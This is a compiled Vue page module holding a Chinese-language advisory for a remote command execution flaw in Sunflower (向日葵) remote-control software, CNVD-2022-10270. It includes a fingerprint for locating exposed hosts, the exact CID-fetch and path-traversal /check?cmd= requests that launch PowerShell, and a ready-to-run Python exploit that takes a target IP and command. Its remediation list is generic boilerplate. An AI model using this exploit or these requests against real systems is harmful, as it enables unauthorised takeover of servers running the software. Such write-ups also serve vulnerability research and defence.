import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as a,e as n}from"./app-58e4a7d6.js";const s={},d=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>向日葵通过发送特定的请求获取CID后，可调用 check接口实现远程命令执行，导致服务器权限被获取</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>11.0.0.33162
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>body=&quot;Verification failure&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>向日葵在开启后会默认在 40000-65535 之间开启某端口</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241354598.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送请求获取CID</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/cgi-bin/rpc?action=verify-haras
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241354132.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>使用获取到的 verify_string 作为 cookie的 CID字段，进行命令执行</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+ipconfig
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241354108.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2><ol><li>输入检查:应用程序必须实现输入检查机制，将所有从外部接收的数据都进行严格的检查和过滤，防止恶意代码被注入。</li><li>参数化查询:采用参数化查询可以防止攻击者通过利用应用程序的注入漏洞来修改查询语句，实现任意代码执行的攻击。</li><li>输出编码:在输出时对敏感字符进行编码保护，比如 HTML 编码，防止恶意代码直接输出执行。</li><li>使用最新的安全防护措施:保证服务器系统和应用程序的所有组件、库和插件都是最 新的，确保已知的漏洞都得到修复。</li><li>强制访问控制:应该设置访问控制机制，确保恶意用户无法访问敏感数据和代码。</li></ol><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><p>exp：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>import requests,sys
 
ip = sys.argv[1]
command = sys.argv[2]
payload1 = &quot;/cgi-bin/rpc?action=verify-haras&quot;
payload2 = &quot;/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+&quot;
headers = {
    &#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#39;
}
 
if &quot;http://&quot; not in ip:
    host = &quot;http://&quot; + ip
else:
    host = ip
 
try:
    s = requests.Session()
    res = s.get(url=host + payload1,headers=headers)
    if res.status_code == 200:
        res = res.json()
        Cid = res[&#39;verify_string&#39;]
        headers.update({&#39;Cookie&#39;:&quot;CID=&quot; + Cid})
        res1 = s.get(url=host + payload2 + command,headers=headers)
        res1.encoding = &quot;GBK&quot;
        print(res1.text)
    else:
        pass
except Exception as e:
    print(e)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,20),r=[d];function l(t,c){return i(),a("div",null,r)}const v=e(s,[["render",l],["__file","向日葵 check 远程命令执行漏洞 CNVD-2022-10270.html.vue"]]);export{v as default};
